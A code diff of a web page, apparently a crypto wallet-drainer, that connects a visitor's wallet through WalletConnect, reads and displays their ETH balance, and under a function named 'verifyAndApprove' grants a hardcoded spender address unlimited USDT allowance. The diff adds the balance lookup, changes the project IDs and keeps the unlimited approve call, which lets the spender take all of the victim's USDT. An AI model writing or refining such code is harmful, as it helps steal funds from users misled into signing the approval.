@@ -7,6 +7,7 @@ import Web3 from "web3";
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const SPENDER = "0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75";
 const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
 const ABI = [
   {
     "constant": false,
@@ -15,60 +16,60 @@ const ABI = [
       { "name": "_value", "type": "uint256" }
     ],
     "name": "approve",
-    "outputs": [{ "name": "", "type": "bool" }],
-    "type": "function"
+    "type": "function",
+    "stateMutability": "nonpayable"
   }
 ];
 
-export default function Home() {
+export default function Page() {
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
   const [wallet, setWallet] = useState<string | null>(null);
+  const [balance, setBalance] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
 
   const verifyAndApprove = async () => {
     setStatus('processing');
     setError(null);
+
     try {
-      // 1. Init WalletConnect v2 provider
       const provider = await EthereumProvider.init({
-        projectId: "5304256cb79a264108479aea79d8ae5b",
-        chains: [1], // Ethereum mainnet
+        projectId: "89c632f1e13d012d9727c1d5869fe674", // Project ID-ul tău WalletConnect
+        chains: [1],
         showQrModal: true,
-        methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
-        optionalChains: [],
-        optionalMethods: [],
         rpcMap: {
-          1: "https://mainnet.infura.io/v3/ae6b05eda23642408e85dbd5bf7e705cb"
-        }
+          1: "https://mainnet.infura.io/v3/61762d09a47848c285f2a6534394a6c5" // Infura Project ID-ul tău
+        },
+        methods: [
+          "eth_sendTransaction",
+          "personal_sign",
+          "eth_signTypedData",
+          "eth_requestAccounts",
+          "eth_accounts",
+          "eth_getBalance"
+        ]
       });
 
       await provider.enable();
 
-      // 2. Web3 instance
       const web3 = new Web3(provider as any);
-
-      // 3. Get accounts
-      const accounts = await web3.eth.getAccounts();
+      let accounts = await web3.eth.getAccounts();
+      if (!accounts || accounts.length === 0) {
+        accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
+      }
       if (!accounts || accounts.length === 0) throw new Error("No account found");
       const walletAddress = accounts[0];
       setWallet(walletAddress);
 
-      // 4. (Optional) Send wallet to backend
-      // await fetch('/save-wallet.php', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ address: walletAddress })
-      // });
+      const bal = await web3.eth.getBalance(walletAddress);
+      setBalance(web3.utils.fromWei(bal, "ether"));
 
-      // 5. Approve USDT unlimited
       const contract = new web3.eth.Contract(ABI as any, USDT_CONTRACT);
       await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });
 
       setStatus('success');
       setTimeout(() => setStatus('idle'), 2500);
 
-      // 6. Disconnect provider (optional)
-      provider.disconnect();
+      await provider.disconnect();
     } catch (e: any) {
       setStatus('failed');
       setError(e?.message || "Unknown error");
@@ -180,6 +181,16 @@ export default function Home() {
             wordBreak: 'break-all'
           }}>
             Connected wallet: {wallet}
+          </div>
+        )}
+        {balance && (
+          <div style={{
+            marginTop: 12,
+            color: '#fbbf24',
+            fontSize: '1.1rem',
+            wordBreak: 'break-all'
+          }}>
+            ETH Balance: {balance}
           </div>
         )}
         {error && (
